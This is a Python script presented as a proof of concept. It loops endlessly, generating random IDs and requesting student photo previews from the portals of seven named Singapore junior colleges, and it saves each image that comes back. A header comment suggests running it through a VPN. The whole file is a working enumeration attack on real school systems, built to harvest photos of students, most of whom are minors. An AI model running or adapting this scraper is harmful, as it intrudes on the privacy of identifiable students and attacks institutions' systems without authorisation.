# PROOF OF CONCEPT
# USE THIS FILE TO GENERATE RANDOM MD5 IDS AND SEND GET REQUEST TO THE PORTALS
# SUGGEST TO USE VPN WHEN RUNNING THIS FILE

import csv
import requests # to get image from the web
import shutil # to save it locally
import os
from itertools import permutations
import time
import random
import hashlib 
import string

alls = string.ascii_letters + string.digits

def asrjc(studentid):
    image_url = f"https://portal.asrjc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"asrjc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass


def nyjc(studentid):
    image_url = f"https://portal.nyjc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"nyjc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass


def jpjc(studentid):
    image_url = f"https://portal.jpjc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"jpjc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass


def yijc(studentid):
    image_url = f"https://portal.yijc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"yijc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass

def tmjc(studentid):
    image_url = f"https://portal.tmjc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"tmjc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass

def ejc(studentid):
    image_url = f"https://portal.ejc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"ejc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass

def tjc(studentid):
    image_url = f"https://matrix.tjc.edu.sg/.image?request=preview&type=Student&id={studentid}"
    filename = f"tjc{studentid}.jpg"

    # Open the url image, set stream to True, this will return the stream content.
    r = requests.get(image_url, stream = True)
    # Check if the image was retrieved successfully
    if r.status_code == 200:
        r.raw.decode_content = True
        # Open a local file with wb ( write binary ) permission.
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print('Image sucessfully Downloaded: ', filename)
    else:
        pass


while True:

    md5 = ''
    for i in range(32):
        char = random.choice(alls)
        md5 += char

    try:
        asrjc(md5)
        ejc(md5)
        nyjc(md5)
        yijc(md5)
        jpjc(md5)
        tjc(md5)
        tmjc(md5)
    except ConnectionError:
        pass

    apple = md5[16:] + md5[:16]  
    #half the md5 and join them tght to get a new md5
    #AAAABBBB to BBBBAAAA

    try:
        asrjc(apple)
        ejc(apple)
        nyjc(apple)
        yijc(apple)
        jpjc(apple)
        tjc(apple)
        tmjc(apple)
    except ConnectionError:
        pass